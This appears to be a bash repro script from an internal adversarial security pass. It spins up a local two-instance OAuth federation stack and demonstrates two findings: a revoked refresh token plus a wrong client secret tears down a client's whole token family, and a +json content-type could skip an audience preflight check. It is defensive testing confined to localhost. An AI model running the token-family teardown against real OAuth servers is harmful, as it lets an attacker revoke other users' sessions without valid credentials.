#!/usr/bin/env bash
# ADVERSARIAL ARTIFACT (adv/fed-e2e) — NOT product source.
#
# Self-contained repro for the two NOVEL federation-seam findings from the
# 2026-08-29 adversarial pass. Brings up the two-instance drill stack, runs a
# headless SSO login, then exercises each finding and asserts on the HUB DB.
#
#   FEDERATION_HUB_DIR=<hub checkout> ./adversarial/fed-e2e/repro-findings.sh
#
# F2 (defense-in-depth): the pinned oauth-provider tears down a refresh
#     family (RFC 9700 reuse detection) BEFORE it validates client
#     credentials, so a holder of one REVOKED refresh token can collapse a
#     CONFIDENTIAL client's whole family with a WRONG/absent secret.
# F4 (latent): token-preflight.ts detects JSON with /^application\/json/i,
#     stricter than the plugin's /^application\/(...\+)?json/i. A +json body
#     skips the preflight's per-client-audience check; today the token
#     endpoint's allowedMediaTypes 415s +json, so it is NOT yet exploitable.
#
# DEV/CI ONLY. Everything is torn down on exit unless DRILL_KEEP=1.
set -euo pipefail
REPO="$(cd "$(dirname "$0")/../.." && pwd)"
PROJECT=slideless-fed-repro
HUB=http://hub.localhost:3300
SL=http://slideless.localhost:3310
SECOND_CLIENT_ID=tool-drill-second
SECOND_CLIENT_SECRET=federation-dev-client-secret-0002
SECOND_RESOURCE=http://second.localhost:3320/mcp
SECOND_REDIRECT=http://second.localhost:3320/callback
SL_RESOURCE=http://slideless.localhost:3310/mcp
say(){ printf '\n\033[1m▸ %s\033[0m\n' "$*"; }
ok(){ printf '  \033[32mOK\033[0m %s\n' "$*"; }
bad(){ printf '  \033[31mBAD\033[0m %s\n' "$*" >&2; exit 1; }
for b in docker jq curl openssl; do command -v "$b" >/dev/null || bad "missing $b"; done
for p in 3300 3310 8474; do curl -s -o /dev/null --max-time 1 "http://127.0.0.1:$p/" 2>/dev/null && bad "port $p busy"; done
SCRATCH="$(mktemp -d "${TMPDIR:-/tmp}/fed-repro.XXXXXX")"
dc(){ docker compose -p "$PROJECT" -f "$REPO/docker-compose.federation.yml" -f "$REPO/docker-compose.federation.drill.yml" "$@"; }
CURL=(curl -sS --max-time 60 --resolve hub.localhost:3300:127.0.0.1 --resolve slideless.localhost:3310:127.0.0.1)
hubdb(){ dc exec -T hub-db psql -U antasphere -d antasphere -v ON_ERROR_STOP=1 -Atc "$1"; }
b64url(){ openssl base64 -A | tr '+/' '-_' | tr -d '='; }
family(){ hubdb "SELECT count(*)||' '||count(*) FILTER (WHERE revoked IS NULL) FROM oauth_refresh_token WHERE client_id='$1' AND user_id='$2'"; }
cleanup(){ local s=$?; if [ "${DRILL_KEEP:-}" = 1 ] && [ "$s" = 0 ]; then echo "  DRILL_KEEP=1: stack left up ($PROJECT)"; else dc down -v --remove-orphans >/dev/null 2>&1 || true; fi; rm -rf "$SCRATCH"; exit "$s"; }
trap cleanup EXIT

say "up"
dc down -v --remove-orphans >/dev/null 2>&1 || true
dc up -d --no-build >/dev/null 2>&1 || dc up -d >/dev/null 2>&1
for i in $(seq 1 150); do "${CURL[@]}" -fso /dev/null "$HUB/healthz" && "${CURL[@]}" -fso /dev/null "$SL/healthz" && break; sleep 2; done
ok "hub + slideless up"

say "setup + hub owner session"
PW="pw-$(openssl rand -hex 6)"; OWNER=owner@repro.test
"${CURL[@]}" -X POST "$HUB/api/v1/setup" -H 'content-type: application/json' -d "{\"instanceName\":\"H\",\"owner\":{\"email\":\"$OWNER\",\"name\":\"O\",\"password\":\"$PW\"}}" >"$SCRATCH/hs.json"
HUB_USER_ID=$(jq -r '.ownerUserId' "$SCRATCH/hs.json"); [ -n "$HUB_USER_ID" ] || bad "no owner"
"${CURL[@]}" -X POST "$SL/api/v1/setup" -H 'content-type: application/json' -d "{\"instanceName\":\"S\",\"owner\":{\"email\":\"slop@repro.test\",\"name\":\"S\",\"password\":\"$PW\"}}" >/dev/null
"${CURL[@]}" -f -o /dev/null -c "$SCRATCH/hub.jar" -X POST "$HUB/api/v1/auth/sign-in/email" -H 'content-type: application/json' -H "Origin: $HUB" -d "{\"email\":\"$OWNER\",\"password\":\"$PW\"}"
ok "owner $HUB_USER_ID signed in"

mint_second_code(){ # -> echoes a fresh authorization code for tool-drill-second
  local v c authz loc; v="$1"
  c=$(printf '%s' "$v" | openssl dgst -sha256 -binary | b64url)
  authz="$HUB/api/v1/auth/oauth2/authorize?response_type=code&client_id=$SECOND_CLIENT_ID&redirect_uri=$SECOND_REDIRECT&scope=openid%20offline_access%20account%3Aread&code_challenge=$c&code_challenge_method=S256&state=x&resource=$SECOND_RESOURCE"
  loc=$("${CURL[@]}" -b "$SCRATCH/hub.jar" -o /dev/null -w '%{redirect_url}' "$authz")
  printf '%s' "$loc" | sed -n 's/.*[?&]code=\([^&]*\).*/\1/p'
}
tok(){ local sec="$1"; shift; "${CURL[@]}" -o "$SCRATCH/tk.json" -w '%{http_code}' -X POST "$HUB/api/v1/auth/oauth2/token" -u "$SECOND_CLIENT_ID:$sec" -H 'content-type: application/x-www-form-urlencoded' "$@"; }

say "F2 — family teardown fires BEFORE client-secret validation"
V=$(openssl rand -hex 32); CODE=$(mint_second_code "$V")
tok "$SECOND_CLIENT_SECRET" --data-urlencode grant_type=authorization_code --data-urlencode "code=$CODE" --data-urlencode "redirect_uri=$SECOND_REDIRECT" --data-urlencode "code_verifier=$V" --data-urlencode "resource=$SECOND_RESOURCE" >/dev/null
T0=$(jq -r '.refresh_token' "$SCRATCH/tk.json")
tok "$SECOND_CLIENT_SECRET" --data-urlencode grant_type=refresh_token --data-urlencode "refresh_token=$T0" --data-urlencode "resource=$SECOND_RESOURCE" >/dev/null  # T0 now revoked
read -r tot live <<<"$(family "$SECOND_CLIENT_ID" "$HUB_USER_ID")"; [ "$tot" = 2 ] && [ "$live" = 1 ] || bad "expected 2/1, got $tot/$live"
# backdate T0.revoked past the 60s grace so we isolate the plugin teardown (not the grace re-arm)
hubdb "UPDATE oauth_refresh_token SET revoked=(now() AT TIME ZONE 'utc')-interval '120 seconds' WHERE client_id='$SECOND_CLIENT_ID' AND user_id='$HUB_USER_ID' AND revoked IS NOT NULL AND revoked > timestamp '1970-01-01 00:00:00'" >/dev/null
st=$(tok "WRONG-SECRET-zzzz" --data-urlencode grant_type=refresh_token --data-urlencode "refresh_token=$T0" --data-urlencode "resource=$SECOND_RESOURCE")
read -r tot live <<<"$(family "$SECOND_CLIENT_ID" "$HUB_USER_ID")"
[ "$st" = 400 ] || bad "expected 400, got $st"
[ "$tot" = 0 ] || bad "family survived ($tot rows) — secret was checked first (finding would be FIXED)"
ok "revoked token + WRONG secret tore the family down (2/1 → 0): teardown precedes secret validation"

say "F4 — content-type coupling (currently defended by allowedMediaTypes)"
V=$(openssl rand -hex 32); CODE=$(mint_second_code "$V")
body(){ jq -nc --arg c "$CODE" --arg rd "$SECOND_REDIRECT" --arg v "$V" --arg r "$SL_RESOURCE" --arg ci "$SECOND_CLIENT_ID" --arg cs "$SECOND_CLIENT_SECRET" '{grant_type:"authorization_code",code:$c,redirect_uri:$rd,code_verifier:$v,resource:$r,client_id:$ci,client_secret:$cs}'; }
st=$("${CURL[@]}" -o "$SCRATCH/ct.json" -w '%{http_code}' -X POST "$HUB/api/v1/auth/oauth2/token" -H 'content-type: application/secevent+json' --data "$(body)")
[ "$st" = 415 ] || bad "+json was NOT 415 (got $st) — the preflight bypass may now be LIVE; align the regexes"
ok "+json body rejected 415 by allowedMediaTypes (preflight skipped it, plugin refused it) — latent, not live"
# sanity: application/json IS caught by the preflight's audience rule
st=$("${CURL[@]}" -o "$SCRATCH/ct.json" -w '%{http_code}' -X POST "$HUB/api/v1/auth/oauth2/token" -H 'content-type: application/json' --data "$(body)")
[ "$st" = 400 ] && grep -q invalid_target "$SCRATCH/ct.json" || bad "application/json foreign-audience not refused: $st"
ok "application/json foreign audience → 400 invalid_target (preflight fires)"

printf '\n\033[32m✔ repro complete — F2 reproduced, F4 confirmed latent-not-live\033[0m\n'
